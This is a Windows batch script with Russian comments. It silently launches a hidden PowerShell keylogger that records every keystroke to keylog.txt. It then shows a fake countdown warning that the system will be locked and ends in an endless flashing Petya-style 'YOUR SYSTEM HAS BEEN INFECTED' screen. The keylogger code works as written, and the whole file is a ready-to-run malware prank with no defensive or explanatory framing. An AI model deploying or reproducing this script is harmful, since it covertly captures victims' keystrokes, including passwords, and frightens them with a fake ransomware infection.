@echo off
setlocal enabledelayedexpansion
title SYSTEM CRITICAL ERROR

:: 1. Запуск кейлоггера в фоне (скрыто, чтобы не мешал таймеру)
start /b powershell -WindowStyle Hidden -Command "$file='keylog.txt'; $code='[DllImport(\"user32.dll\")]public static extern short GetAsyncKeyState(int vKey);'; $type=Add-Type -MemberDefinition $code -Name 'Win' -Namespace 'Utils' -PassThru; while($true){for($i=8;$i -le 190;$i++){if($type::GetAsyncKeyState($i) -eq -32767){[System.IO.File]::AppendAllText($file,[char]$i)}}; Start-Sleep -Milliseconds 40}"

:: 2. Таймер обратного отсчета
color 0F
for /l %%i in (30,-1,1) do (
    cls
    echo ======================================================
    echo     ВНИМАНИЕ! СИСТЕМА БУДЕТ ЗАБЛОКИРОВАНА ЧЕРЕЗ:
    echo ======================================================
    echo.
    echo                    [ %%i СЕКУНД ]
    echo.
    echo ======================================================
    timeout /t 1 >nul
)

:: 3. Тот самый мигающий скелет Petya
:petya
cls
color 0C
echo.
echo      !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
echo      !!                                          !!
echo      !!      YOUR SYSTEM HAS BEEN INFECTED       !!
echo      !!                                          !!
echo      !!                XXXXX                     !!
echo      !!               X     X                    !!
echo      !!              X  O O  X                   !!
echo      !!              X   ^   X                   !!
echo      !!               X \_/ X                    !!
echo      !!                XXXXX                     !!
echo      !!                                          !!
echo      !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
timeout /t 1 /nobreak >nul
color C0
goto petya
